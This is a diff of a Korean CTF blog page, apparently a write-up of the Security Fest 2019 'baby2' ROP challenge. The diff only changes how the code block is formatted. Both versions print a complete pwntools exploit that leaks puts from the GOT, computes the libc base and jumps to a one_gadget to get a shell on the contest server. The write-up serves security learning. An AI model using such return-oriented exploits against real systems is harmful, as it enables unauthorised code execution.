@@ -20,19 +20,19 @@
     
         <meta name="keywords" content="CTF">
     
-    <meta name="description" content="Baby2 기본 ROP 문제 바이너리 우분투 18.04 환경에서는  main으로 안 돌아가는 경우도 있는 것 같다. [1]  (일단 난 잘됨)  from pwn import *  #r = process(&apos;./baby2&apos;) r = remote(&apos;baby-01.pwn.beer&apos;, 10002) e = ELF(&apos;./baby2&apos;) libc = ELF(&apos;./libc">
+    <meta name="description" content="Baby2 기본 ROP 문제 바이너리 우분투 18.04 환경에서는  main으로 안 돌아가는 경우도 있는 것 같다. [1]  (일단 난 잘됨)  12345678910111213141516171819202122232425262728293031323334353637383940from pwn import *#r = process(&apos;./baby2&apos;)r = rem">
 <meta name="keywords" content="CTF">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Security Fest 2019 baby2">
 <meta property="og:url" content="http://j0n9hyun.github.io/2019/05/24/Security-Fest-2019-baby2/index.html">
 <meta property="og:site_name" content="j0n9hyun">
-<meta property="og:description" content="Baby2 기본 ROP 문제 바이너리 우분투 18.04 환경에서는  main으로 안 돌아가는 경우도 있는 것 같다. [1]  (일단 난 잘됨)  from pwn import *  #r = process(&apos;./baby2&apos;) r = remote(&apos;baby-01.pwn.beer&apos;, 10002) e = ELF(&apos;./baby2&apos;) libc = ELF(&apos;./libc">
+<meta property="og:description" content="Baby2 기본 ROP 문제 바이너리 우분투 18.04 환경에서는  main으로 안 돌아가는 경우도 있는 것 같다. [1]  (일단 난 잘됨)  12345678910111213141516171819202122232425262728293031323334353637383940from pwn import *#r = process(&apos;./baby2&apos;)r = rem">
 <meta property="og:locale" content="ko">
 <meta property="og:image" content="https://user-images.githubusercontent.com/16969364/58294548-a46c2d80-7e05-11e9-8941-275e6762359b.PNG">
 <meta property="og:updated_time" content="2019-06-30T06:09:40.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Security Fest 2019 baby2">
-<meta name="twitter:description" content="Baby2 기본 ROP 문제 바이너리 우분투 18.04 환경에서는  main으로 안 돌아가는 경우도 있는 것 같다. [1]  (일단 난 잘됨)  from pwn import *  #r = process(&apos;./baby2&apos;) r = remote(&apos;baby-01.pwn.beer&apos;, 10002) e = ELF(&apos;./baby2&apos;) libc = ELF(&apos;./libc">
+<meta name="twitter:description" content="Baby2 기본 ROP 문제 바이너리 우분투 18.04 환경에서는  main으로 안 돌아가는 경우도 있는 것 같다. [1]  (일단 난 잘됨)  12345678910111213141516171819202122232425262728293031323334353637383940from pwn import *#r = process(&apos;./baby2&apos;)r = rem">
 <meta name="twitter:image" content="https://user-images.githubusercontent.com/16969364/58294548-a46c2d80-7e05-11e9-8941-275e6762359b.PNG">
     
 	<link rel="canonical" href="http://j0n9hyun.github.io/2019/05/24/security-fest-2019-baby2/">
@@ -64,7 +64,7 @@
     
 
 
-<link rel="stylesheet" href="/css/prism.css" type="text/css"></head>
+</head>
 </html>
 <body>
     <div id="wrap">
@@ -182,7 +182,7 @@
         <a class="tag-link" href="/tags/CTF/">CTF</a>
     </div>
 
-  			<span class="reading-time">⏱ 2 분</span>
+  			<span class="reading-time">⏱ 3 분</span>
             </div>
         
         
@@ -191,47 +191,7 @@
 <p><code>기본 ROP 문제</code></p>
 <p><a href="https://github.com/j0n9hyun/j0n9hyun.github.io/files/3342581/baby2.zip" target="_blank" rel="noopener"><strong>바이너리</strong></a></p>
 <p>우분투 18.04 환경에서는  main으로 안 돌아가는 경우도 있는 것 같다. <sup id="fnref:1"><a href="#fn:1" rel="footnote"><span class="hint--top hint--error hint--medium hint--rounded hint--bounce" aria-label="내부 인스트럭션에서 조금 차이가 있는 듯하다. [참고](https://kong.re.kr/?p=335)">[1]</span></a></sup> <small> (일단 난 잘됨) </small></p>
-<pre class="highlight"><code class="python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
-
-<span class="hljs-comment">#r = process('./baby2')</span>
-r = remote(<span class="hljs-string">'baby-01.pwn.beer'</span>, <span class="hljs-number">10002</span>)
-e = ELF(<span class="hljs-string">'./baby2'</span>)
-libc = ELF(<span class="hljs-string">'./libc.so.6'</span>)
-
-ru = <span class="hljs-keyword">lambda</span> a: r.recvuntil(a)
-sl = <span class="hljs-keyword">lambda</span> a: r.sendline(a)
-sla = <span class="hljs-keyword">lambda</span> a, b: r.sendlineafter(a, b)
-ex = <span class="hljs-keyword">lambda</span> : r.interactive()
-
-puts_offset = libc.symbols[<span class="hljs-string">'puts'</span>]
-puts_plt = e.plt[<span class="hljs-string">'puts'</span>]
-puts_got = e.got[<span class="hljs-string">'puts'</span>]
-main = e.symbols[<span class="hljs-string">'main'</span>]
-pr = <span class="hljs-number">0x0000000000400783</span> <span class="hljs-comment"># pop rdi; ret</span>
-binsh_offset = libc.search(<span class="hljs-string">'/bin/sh'</span>).next()
-system_offset = libc.symbols[<span class="hljs-string">'system'</span>]
-one_gadget = <span class="hljs-number">0x4f2c5</span>
-
-p = <span class="hljs-string">""</span>
-p += <span class="hljs-string">"\x90"</span>*<span class="hljs-number">0x18</span>
-p += p64(pr)
-p += p64(puts_got)
-p += p64(puts_plt)
-p += p64(main) 
-sl(p)
-
-ru(<span class="hljs-string">"input: "</span>)
-leaked = u64(r.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\x00'</span>))
-<span class="hljs-keyword">print</span> hex(leaked)
-libc_base = leaked - puts_offset
-one_shot = libc_base + one_gadget
-
-p = <span class="hljs-string">""</span>
-p += <span class="hljs-string">"\x90"</span>*<span class="hljs-number">0x18</span>
-p += p64(one_shot)
-sla(<span class="hljs-string">'input: '</span>, p)
-ex()
-</code></pre>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process('./baby2')</span></span><br><span class="line">r = remote(<span class="string">'baby-01.pwn.beer'</span>, <span class="number">10002</span>)</span><br><span class="line">e = ELF(<span class="string">'./baby2'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> a: r.recvuntil(a)</span><br><span class="line">sl = <span class="keyword">lambda</span> a: r.sendline(a)</span><br><span class="line">sla = <span class="keyword">lambda</span> a, b: r.sendlineafter(a, b)</span><br><span class="line">ex = <span class="keyword">lambda</span> : r.interactive()</span><br><span class="line"></span><br><span class="line">puts_offset = libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">puts_plt = e.plt[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = e.got[<span class="string">'puts'</span>]</span><br><span class="line">main = e.symbols[<span class="string">'main'</span>]</span><br><span class="line">pr = <span class="number">0x0000000000400783</span> <span class="comment"># pop rdi; ret</span></span><br><span class="line">binsh_offset = libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line">system_offset = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">one_gadget = <span class="number">0x4f2c5</span></span><br><span class="line"></span><br><span class="line">p = <span class="string">""</span></span><br><span class="line">p += <span class="string">"\x90"</span>*<span class="number">0x18</span></span><br><span class="line">p += p64(pr)</span><br><span class="line">p += p64(puts_got)</span><br><span class="line">p += p64(puts_plt)</span><br><span class="line">p += p64(main) </span><br><span class="line">sl(p)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">"input: "</span>)</span><br><span class="line">leaked = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> hex(leaked)</span><br><span class="line">libc_base = leaked - puts_offset</span><br><span class="line">one_shot = libc_base + one_gadget</span><br><span class="line"></span><br><span class="line">p = <span class="string">""</span></span><br><span class="line">p += <span class="string">"\x90"</span>*<span class="number">0x18</span></span><br><span class="line">p += p64(one_shot)</span><br><span class="line">sla(<span class="string">'input: '</span>, p)</span><br><span class="line">ex()</span><br></pre></td></tr></table></figure>
 <center><small>[Exploit Code]</small></center> <br>
 <img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58294548-a46c2d80-7e05-11e9-8941-275e6762359b.PNG">
 <center><small>[Remote]</small></center> <br>
@@ -248,7 +208,7 @@ ex()
 
 
 
-    <a data-url="http://j0n9hyun.github.io/2019/05/24/Security-Fest-2019-baby2/" data-id="ck00o3nqy001qz7fpakw967um" class="article-share-link"><i class="fa fa-share"></i>공유하기</a>
+    <a data-url="http://j0n9hyun.github.io/2019/05/24/Security-Fest-2019-baby2/" data-id="ck00obmkb001qhifpn53n86s2" class="article-share-link"><i class="fa fa-share"></i>공유하기</a>
 <script>
     (function ($) {
         $('body').on('click', function() {
@@ -330,13 +290,8 @@ ex()
 기본 ROP 문제
 바이너리
 우분투 18.04 환경에서는  main으로 안 돌아가는 경우도 있는 것 같다. [1]  (일단 난 잘됨) 
-from pwn import *
-
-#r = process('./baby2')
-r = remote('baby-01.pwn.beer', 10002)
-e = ELF('./baby2')
-libc = ELF('./libc"
-        "wordCount": 242
+12345678910111213141516171819202122232425262728293031323334353637383940from pwn import *#r = process('./baby2')r = rem"
+        "wordCount": 324
     }
 </script>
 
